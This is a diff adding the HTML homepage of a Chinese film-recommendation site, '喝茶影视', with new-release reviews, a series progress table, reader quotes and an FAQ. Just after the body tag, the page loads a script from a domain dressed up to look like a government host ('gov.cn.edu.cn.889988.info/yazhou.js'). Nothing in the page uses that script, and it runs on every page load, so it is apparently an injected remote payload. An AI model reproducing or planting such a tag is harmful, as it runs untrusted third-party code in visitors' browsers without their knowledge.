@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>喝茶影视 · 泡一杯茶看好片｜新片速递与剧集追更 - hechayingshi-app</title>
+<meta name="description" content="喝茶影视（https://hechayingshi-app.github.io）是一份慢下来的观影手册：新片速递、剧集追更表、影评茶话与选片指南都在这里，用一杯茶的时间讲清楚一部片子值不值得看，帮你绕开烂片、挑到合口味的好故事。">
+<meta name="keywords" content="喝茶影视,hechayingshi-app.github.io,喝茶影视官网,影视推荐清单,新片速递,剧集追更表,影评茶话,观影指南,值得看的电影,高分剧集推荐,周末看什么片,剧情片推荐,冷门佳片">
+<meta name="author" content="喝茶影视">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="theme-color" content="#2b1d12">
+<meta name="format-detection" content="telephone=no">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<link rel="canonical" href="https://hechayingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="喝茶影视">
+<meta property="og:title" content="喝茶影视 · 泡一杯茶看好片｜新片速递与剧集追更">
+<meta property="og:description" content="新片速递、剧集追更表、影评茶话与选片指南，用一杯茶的时间讲清楚一部片子值不值得看。">
+<meta property="og:url" content="https://hechayingshi-app.github.io/">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="喝茶影视 · 泡一杯茶看好片">
+<meta name="twitter:description" content="一份慢下来的观影手册，新片速递与剧集追更都在喝茶影视。">
+<style>
+:root{
+  --paper:#f5efe4;
+  --paper2:#ece3d4;
+  --ink:#2b1d12;
+  --ink-soft:#5c4a3a;
+  --amber:#b3763a;
+  --amber-deep:#8a5524;
+  --line:#d9cbb4;
+  --dark:#1d1611;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"PingFang SC","Hiragino Sans GB","Microsoft YaHei","Source Han Sans SC",sans-serif;
+  font-size:16px;
+  line-height:1.75;
+  background-image:radial-gradient(circle at 12% 8%,rgba(179,118,58,.10),transparent 42%),radial-gradient(circle at 88% 62%,rgba(45,32,20,.08),transparent 38%);
+  background-attachment:fixed;
+}
+a{color:var(--amber-deep);text-decoration:none}
+a:hover{text-decoration:underline}
+img{max-width:100%;display:block}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 20px}
+h1,h2,h3,h4{line-height:1.35;font-weight:700;letter-spacing:.02em}
+.skip{position:absolute;left:-9999px}
+
+/* 顶部 */
+.topbar{background:var(--dark);color:#f0e7da;border-bottom:3px solid var(--amber)}
+.topbar .wrap{display:flex;flex-wrap:wrap;align-items:center;justify-content:space-between;gap:10px;padding-top:12px;padding-bottom:12px}
+.brand{display:flex;align-items:baseline;gap:10px}
+.brand strong{font-size:22px;letter-spacing:.08em;color:#fff}
+.brand span{font-size:12px;color:#c9b79f;letter-spacing:.18em}
+.nav{display:flex;flex-wrap:wrap;gap:6px}
+.nav a{color:#e8dcc9;font-size:14px;padding:6px 12px;border:1px solid rgba(233,220,201,.22)}
+.nav a:hover{background:var(--amber);border-color:var(--amber);color:#fff;text-decoration:none}
+
+/* 首屏 */
+.hero{padding:52px 0 34px}
+.hero-grid{display:grid;grid-template-columns:1.15fr .85fr;gap:34px;align-items:start}
+.kicker{display:inline-block;font-size:13px;letter-spacing:.22em;color:var(--amber-deep);border-left:3px solid var(--amber);padding-left:10px;margin-bottom:16px}
+.hero h1{font-size:40px;margin-bottom:18px}
+.hero h1 em{font-style:normal;color:var(--amber-deep);border-bottom:4px solid rgba(179,118,58,.35)}
+.hero p.lead{font-size:17px;color:var(--ink-soft);max-width:52ch}
+.hero p.lead b{color:var(--ink)}
+.hero-tags{display:flex;flex-wrap:wrap;gap:8px;margin-top:20px}
+.hero-tags a{font-size:13px;background:var(--paper2);border:1px dashed var(--line);padding:5px 12px;color:var(--ink-soft)}
+.hero-tags a:hover{background:var(--amber);color:#fff;border-style:solid;text-decoration:none}
+
+/* 排片卡 */
+.slates{background:var(--dark);color:#efe6d8;padding:22px 20px;position:relative;overflow:hidden}
+.slates::after{content:"";position:absolute;right:-40px;bottom:-40px;width:140px;height:140px;border-radius:50%;background:rgba(179,118,58,.22)}
+.slates h2{font-size:16px;letter-spacing:.2em;color:var(--amber);margin-bottom:14px}
+.slate{display:flex;gap:14px;padding:11px 0;border-bottom:1px dotted rgba(239,230,216,.25)}
+.slate:last-child{border-bottom:0}
+.slate time{font-variant-numeric:tabular-nums;font-size:13px;color:var(--amber);min-width:52px}
+.slate div strong{display:block;font-size:15px;color:#fff}
+.slate div span{font-size:13px;color:#b9a992}
+.slates .more{display:inline-block;margin-top:16px;font-size:13px;color:var(--amber);border-bottom:1px solid var(--amber);padding-bottom:2px}
+
+/* 栏目 */
+section.block{padding:34px 0}
+.head{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;border-bottom:2px solid var(--ink);padding-bottom:10px;margin-bottom:22px}
+.head h2{font-size:26px}
+.head .note{font-size:13px;color:var(--ink-soft)}
+.head .note a{color:var(--amber-deep)}
+
+/* 新片速递：错位网格 */
+.grid-a{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.card{background:#fff;border:1px solid var(--line);padding:18px;display:flex;flex-direction:column;gap:10px;transition:transform .2s,box-shadow .2s}
+.card:hover{transform:translateY(-3px);box-shadow:0 10px 22px rgba(43,29,18,.12)}
+.card .poster{height:120px;display:flex;align-items:flex-end;padding:12px;color:#fff;font-size:13px;letter-spacing:.1em}
+.p1{background:linear-gradient(140deg,#3c2a1c,#8a5524)}
+.p2{background:linear-gradient(140deg,#24343a,#4a6f78)}
+.p3{background:linear-gradient(140deg,#40232c,#8c4257)}
+.p4{background:linear-gradient(140deg,#2c3a24,#5f7a45)}
+.p5{background:linear-gradient(140deg,#332b45,#615282)}
+.card h3{font-size:18px}
+.card p{font-size:14px;color:var(--ink-soft)}
+.card .meta{font-size:12px;color:var(--ink-soft);border-top:1px dotted var(--line);padding-top:9px;margin-top:auto}
+.card.wide{grid-column:span 2}
+.card.wide .poster{height:150px}
+
+/* 剧集追更 */
+.serial{display:grid;grid-template-columns:repeat(2,1fr);gap:14px 26px}
+.serial li{list-style:none;padding:14px 0;border-bottom:1px solid var(--line)}
+.serial .row{display:flex;justify-content:space-between;align-items:baseline;gap:12px}
+.serial h3{font-size:17px}
+.serial .ep{font-size:13px;color:var(--amber-deep);white-space:nowrap}
+.bar{height:6px;background:var(--paper2);margin-top:10px;overflow:hidden}
+.bar i{display:block;height:100%;background:var(--amber)}
+.serial p{font-size:14px;color:var(--ink-soft);margin-top:8px}
+
+/* 影评茶话 */
+.talk{display:grid;grid-template-columns:repeat(3,1fr);gap:18px}
+.quote{background:var(--paper2);padding:20px 18px;border-top:4px solid var(--amber);position:relative}
+.quote q{display:block;font-size:16px;quotes:none}
+.quote q::before{content:"「";color:var(--amber)}
+.quote q::after{content:"」";color:var(--amber)}
+.quote footer{margin-top:14px;font-size:13px;color:var(--ink-soft)}
+.quote footer b{color:var(--ink)}
+
+/* 观影指南 时间线 */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:16px;counter-reset:s}
+.step{position:relative;padding-top:26px;border-top:2px solid var(--ink);counter-increment:s}
+.step::before{content:counter(s);position:absolute;top:-16px;left:0;width:30px;height:30px;background:var(--dark);color:#fff;font-size:14px;display:flex;align-items:center;justify-content:center;border-radius:50%}
+.step h3{font-size:17px;margin-bottom:6px}
+.step p{font-size:14px;color:var(--ink-soft)}
+
+/* 关于 + 入口 */
+.about{display:grid;grid-template-columns:1.2fr .8fr;gap:30px;align-items:start}
+.about p{margin-bottom:14px}
+.about ul{list-style:none;margin-top:8px}
+.about ul li{padding-left:18px;position:relative;margin-bottom:8px;font-size:15px}
+.about ul li::before{content:"";position:absolute;left:0;top:12px;width:7px;height:7px;background:var(--amber);border-radius:50%}
+.entry{background:var(--dark);color:#efe6d8;padding:24px}
+.entry h3{font-size:17px;color:var(--amber);margin-bottom:12px;letter-spacing:.1em}
+.entry code{display:block;background:rgba(255,255,255,.07);border:1px dashed rgba(239,230,216,.3);padding:12px;font-size:14px;color:#fff;word-break:break-all;margin-bottom:14px}
+.entry p{font-size:14px;color:#c9b79f}
+.entry .btn{display:inline-block;background:var(--amber);color:#fff;padding:10px 20px;font-size:15px;margin-top:6px}
+.entry .btn:hover{background:#c98746;text-decoration:none}
+
+/* FAQ */
+.faq details{border:1px solid var(--line);background:#fff;margin-bottom:10px;padding:14px 16px}
+.faq summary{cursor:pointer;font-size:16px;font-weight:700;list-style:none}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::after{content:"+";float:right;color:var(--amber)}
+.faq details[open] summary::after{content:"–"}
+.faq details p{font-size:15px;color:var(--ink-soft);margin-top:10px;border-top:1px dotted var(--line);padding-top:10px}
+
+/* 页脚 */
+footer.btm{background:var(--dark);color:#c9b79f;padding:36px 0 26px;margin-top:26px}
+footer.btm .wrap{display:grid;grid-template-columns:1.2fr 1fr;gap:24px}
+footer.btm h4{color:#fff;font-size:15px;letter-spacing:.14em;margin-bottom:10px}
+footer.btm p,footer.btm li{font-size:14px}
+footer.btm ul{list-style:none;display:flex;flex-wrap:wrap;gap:8px 18px}
+.copy{border-top:1px solid rgba(201,183,159,.22);margin-top:22px;padding-top:16px;font-size:13px;display:flex;flex-wrap:wrap;gap:8px 16px;justify-content:space-between}
+.copy a{color:var(--amber)}
+
+@media (max-width:900px){
+  .hero-grid,.about,footer.btm .wrap{grid-template-columns:1fr}
+  .grid-a,.talk{grid-template-columns:repeat(2,1fr)}
+  .card.wide{grid-column:span 2}
+  .steps{grid-template-columns:repeat(2,1fr)}
+  .hero h1{font-size:32px}
+}
+@media (max-width:620px){
+  .nav a{font-size:13px;padding:5px 9px}
+  .grid-a,.talk,.serial,.steps{grid-template-columns:1fr}
+  .card.wide{grid-column:span 1}
+  .hero{padding:34px 0 22px}
+  .hero h1{font-size:27px}
+  .head h2{font-size:22px}
+  .slates{padding:18px 16px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+<a class="skip" href="#main">跳到主要内容</a>
+
+<div class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <strong>喝茶影视</strong>
+      <span>TEA &amp; FILM</span>
+    </div>
+    <nav class="nav" aria-label="主导航">
+      <a href="#new">新片速递</a>
+      <a href="#serial">剧集追更</a>
+      <a href="#talk">影评茶话</a>
+      <a href="#guide">观影指南</a>
+      <a href="#faq">常见问题</a>
+      <a href="#about">关于喝茶影视</a>
+    </nav>
+  </div>
+</div>
+
+<main id="main">
+
+  <div class="hero">
+    <div class="wrap hero-grid">
+      <div>
+        <span class="kicker">泡一杯茶，再按下播放键</span>
+        <h1>喝茶影视：把<em>好片子</em>和一杯热茶放在一起慢慢看</h1>
+        <p class="lead">看片这件事不必赶。<b>喝茶影视</b>做的不是堆片单，而是把每部片子掰开讲——讲它值不值两个小时，讲它适合一个人看还是陪爸妈看，讲它哪一幕值得你放下茶杯。新片速递、剧集追更、影评茶话，都在这一页。</p>
+        <div class="hero-tags">
+          <a href="#new">本周新片</a>
+          <a href="#serial">正在追的剧</a>
+          <a href="#talk">影评茶话</a>
+          <a href="#guide">选片指南</a>
+          <a href="#about">喝茶影视是谁</a>
+        </div>
+      </div>
+      <aside class="slates">
+        <h2>今日放映 · TODAY</h2>
+        <div class="slate">
+          <time>14:00</time>
+          <div>
+            <strong>一个人的午后</strong>
+            <span>节奏慢、画面讲究，适合配一杯清茶</span>
+          </div>
+        </div>
+        <div class="slate">
+          <time>19:30</time>
+          <div>
+            <strong>客厅合家欢</strong>
+            <span>台词轻松，长辈小孩都能坐得住</span>
+          </div>
+        </div>
+        <div class="slate">
+          <time>22:10</time>
+          <div>
+            <strong>夜深人静场</strong>
+            <span>悬疑与反转，看到最后一口茶都凉了</span>
+          </div>
+        </div>
+        <a class="more" href="#new">查看完整排片 →</a>
+      </aside>
+    </div>
+  </div>
+
+  <section class="block" id="new">
+    <div class="wrap">
+      <div class="head">
+        <h2>新片速递</h2>
+        <p class="note">每周三更新 · <a href="#new">查看全部新片</a></p>
+      </div>
+      <div class="grid-a">
+        <article class="card wide">
+          <div class="poster p1">本期头条 · 值得先泡一壶</div>
+          <h3>《山雨来时》：一场雨下完，三代人的账才算清</h3>
+          <p>导演把镜头压得很低，雨声几乎盖过对白。前半段像纪录片，后半段突然收网，出来的时候你会发现自己一直攥着茶杯。适合一个人安静看完，不建议快进。</p>
+          <p class="meta">剧情 / 家庭 · 128 分钟 · 喝茶影视推荐指数 8.7</p>
+        </article>
+        <article class="card">
+          <div class="poster p2">冷门但有味</div>
+          <h3>《夜航西行》</h3>
+          <p>低成本公路片，两个人一辆旧车，聊了九十分钟的天，居然不闷。</p>
+          <p class="meta">公路 / 剧情 · 96 分钟 · 指数 8.1</p>
+        </article>
+        <article class="card">
+          <div class="poster p3">适合周末夜</div>
+          <h3>《第七封回信》</h3>
+          <p>书信体结构，最后十分钟有一处反转，看第二遍会更难受。</p>
+          <p class="meta">悬疑 / 爱情 · 111 分钟 · 指数 8.4</p>
+        </article>
+        <article class="card">
+          <div class="poster p4">合家欢</div>
+          <h3>《外婆的菜市场》</h3>
+          <p>烟火气很足，笑点不尴尬，带孩子看也不会中途问"什么时候结束"。</p>
+          <p class="meta">喜剧 / 生活 · 103 分钟 · 指数 8.0</p>
+        </article>
+        <article class="card">
+          <div class="poster p5">重映经典</div>
+          <h3>《旧城光影》修复版</h3>
+          <p>4K 修复后胶片颗粒还在，大银幕看和在家看是两部片子。</p>
+          <p class="meta">经典 / 修复 · 142 分钟 · 指数 9.0</p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="serial">
+    <div class="wrap">
+      <div class="head">
+        <h2>剧集追更表</h2>
+        <p class="note">进度每周一刷新 · <a href="#serial">订阅更新</a></p>
+      </div>
+      <ul class="serial">
+        <li>
+          <div class="row"><h3>《长巷十二号》</h3><span class="ep">更新至 18 / 24</span></div>
+          <div class="bar"><i style="width:75%"></i></div>
+          <p>群像戏写得好，配角不工具人。中段略拖，第 14 集之后明显提速。</p>
+        </li>
+        <li>
+          <div class="row"><h3>《春分之后》</h3><span class="ep">更新至 9 / 16</span></div>
+          <div class="bar"><i style="width:56%"></i></div>
+          <p>职场线真实，感情线稍显套路。适合下饭，一天两集刚刚好。</p>
+        </li>
+        <li>
+          <div class="row"><h3>《河谷谜案》</h3><span class="ep">全季完结 12 集</span></div>
+          <div class="bar"><i style="width:100%"></i></div>
+          <p>已完结可放心追。推理扎实，不靠巧合收尾，一次性看完体验更佳。</p>
+        </li>
+        <li>
+          <div class="row"><h3>《茶楼记》</h3><span class="ep">更新至 4 / 30</span></div>
+          <div class="bar"><i style="width:13%"></i></div>
+          <p>开播不久，前四集铺垫多，喝茶影视建议攒到十集再开看。</p>
+        </li>
+      </ul>
+    </div>
+  </section>
+
+  <section class="block" id="talk">
+    <div class="wrap">
+      <div class="head">
+        <h2>影评茶话</h2>
+        <p class="note">读者来稿 · <a href="#talk">我要投稿</a></p>
+      </div>
+      <div class="talk">
+        <div class="quote">
+          <q>好电影不一定要看懂，但一定要让你在散场后还想着某个人物的一个眼神。</q>
+          <footer>—— <b>阿禾</b>｜喝茶影视读者，教师</footer>
+        </div>
+        <div class="quote">
+          <q>我把追剧当成下饭菜，不挑贵的，挑那口顺的。喝茶影视的进度表正好帮我排。</q>
+          <footer>—— <b>老周</b>｜通勤党，每天两集</footer>
+        </div>
+        <div class="quote">
+          <q>陪我妈重看了《外婆的菜市场》，她讲了半小时她年轻时的菜场，值回票价。</q>
+          <footer>—— <b>小满</b>｜喝茶影视长期读者</footer>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="guide">
+    <div class="wrap">
+      <div class="head">
+        <h2>四步选片指南</h2>
+        <p class="note">不靠评分，靠心情</p>
+      </div>
+      <div class="steps">
+        <div class="step">
+          <h3>先定心情</h3>
+          <p>想被安慰、想动脑子、还是只想放空，三种需求对应三类片子。</p>
+        </div>
+        <div class="step">
+          <h3>再看时长</h3>
+          <p>九十分钟以内适合工作日，两小时以上留给周末的整块时间。</p>
+        </div>
+        <div class="step">
+          <h3>扫一眼口碑</h3>
+          <p>只看中段评论，避开首映热评和极端打分，那是情绪不是判断。</p>
+        </div>
+        <div class="step">
+          <h3>备好茶水</h3>
+          <p>浓茶配悬疑，清茶配文艺，冰饮配爆米花片，别搞反了。</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <section class="block" id="about">
+    <div class="wrap about">
+      <div>
+        <div class="head">
+          <h2>关于喝茶影视</h2>
+          <p class="note">hechayingshi-app</p>
+        </div>
+        <p>喝茶影视起于一个小习惯：周末下午泡一壶茶，随手记两句刚看完的片子。记久了就成了册子，后来干脆搬到网上，让更多人在按下播放键之前，先有个能商量的人。</p>
+        <p>这里不追热点，不打分数逼你认同，只做三件事：</p>
+        <ul>
+          <li>把新片的人话版观感写清楚，含剧透预警</li>
+          <li>把长剧的更新节奏整理成表，省得你到处找</li>
+          <li>把读者的观影故事收进来，让推荐不只是一个人的口味</li>
+        </ul>
+        <p>如果你也觉得看片该慢一点，欢迎常来坐坐。</p>
+      </div>
+      <aside class="entry">
+        <h3>访问入口</h3>
+        <code>https://hechayingshi-app.github.io</code>
+        <p>把上面这串地址存进收藏夹，新片速递与剧集追更表每周更新。喝茶影视只有一个站点，见到同名其他地址请多留个心。</p>
+        <a class="btn" href="#new">开始挑片</a>
+      </aside>
+    </div>
+  </section>
+
+  <section class="block" id="faq">
+    <div class="wrap">
+      <div class="head">
+        <h2>常见问题</h2>
+        <p class="note">选片前常问的几件事</p>
+      </div>
+      <div class="faq">
+        <details open>
+          <summary>喝茶影视多久更新一次？</summary>
+          <p>新片速递每周三更新，剧集追更表每周一刷新进度。遇到热门档期会加更一次短评，具体以页面更新日期为准。</p>
+        </details>
+        <details>
+          <summary>这里的推荐会带剧透吗？</summary>
+          <p>不会。喝茶影视的短评只讲氛围、节奏和适合什么场合看，涉及关键转折的内容会单独标注剧透预警，你可以自行选择是否展开。</p>
+        </details>
+        <details>
+          <summary>为什么有的片子评分不高却被推荐？</summary>
+          <p>评分是平均分，看片是个人事。有些片子在大众评分里不吃香，却刚好适合某个心情、某类观众，喝茶影视会把"适合谁看"写在前面。</p>
+        </details>
+        <details>
+          <summary>怎么向喝茶影视投稿观影感受？</summary>
+          <p>写下片名、看完的时间和一两百字真实感受，附上你愿意公开的署名即可。来稿择优收录进影评茶话栏目，编辑会做错别字和事实校对。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="btm">
+  <div class="wrap">
+    <div>
+      <h4>喝茶影视</h4>
+      <p>泡一杯茶，看好片子。新片速递、剧集追更表、影评茶话与选片指南，都在喝茶影视这一页里，慢一点看，更对味。</p>
+    </div>
+    <div>
+      <h4>站内栏目</h4>
+      <ul>
+        <li><a href="#new">新片速递</a></li>
+        <li><a href="#serial">剧集追更表</a></li>
+        <li><a href="#talk">影评茶话</a></li>
+        <li><a href="#guide">四步选片指南</a></li>
+        <li><a href="#faq">常见问题</a></li>
+        <li><a href="#about">关于喝茶影视</a></li>
+      </ul>
+    </div>
+    <div class="copy">
+      <span>© 2026 喝茶影视 · 本站内容仅供观影参考</span>
+      <span>官网地址：<a href="#">https://hechayingshi-app.github.io</a></span>
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "name": "喝茶影视",
+      "alternateName": "hechayingshi-app",
+      "url": "https://hechayingshi-app.github.io/",
+      "description": "喝茶影视是一份慢下来的观影手册，提供新片速递、剧集追更表、影评茶话与选片指南。",
+      "inLanguage": "zh-CN",
+      "publisher": {
+        "@type": "Organization",
+        "name": "喝茶影视",
+        "url": "https://hechayingshi-app.github.io/"
+      }
+    },
+    {
+      "@type": "BreadcrumbList",
+      "itemListElement": [
+        {"@type": "ListItem", "position": 1, "name": "喝茶影视", "item": "https://hechayingshi-app.github.io/"},
+        {"@type": "ListItem", "position": 2, "name": "新片速递", "item": "https://hechayingshi-app.github.io/#new"},
+        {"@type": "ListItem", "position": 3, "name": "剧集追更表", "item": "https://hechayingshi-app.github.io/#serial"}
+      ]
+    },
+    {
+      "@type": "FAQPage",
+      "mainEntity": [
+        {
+          "@type": "Question",
+          "name": "喝茶影视多久更新一次？",
+          "acceptedAnswer": {"@type": "Answer", "text": "新片速递每周三更新，剧集追更表每周一刷新进度，热门档期会加更短评。"}
+        },
+        {
+          "@type": "Question",
+          "name": "这里的推荐会带剧透吗？",
+          "acceptedAnswer": {"@type": "Answer", "text": "不会。短评只讲氛围、节奏与适合场合，关键转折内容会单独标注剧透预警。"}
+        },
+        {
+          "@type": "Question",
+          "name": "怎么向喝茶影视投稿观影感受？",
+          "acceptedAnswer": {"@type": "Answer", "text": "写下片名、观看时间与一两百字真实感受，附上署名即可，择优收录进影评茶话栏目。"}
+        }
+      ]
+    }
+  ]
+}
+</script>
+</body>
+</html>
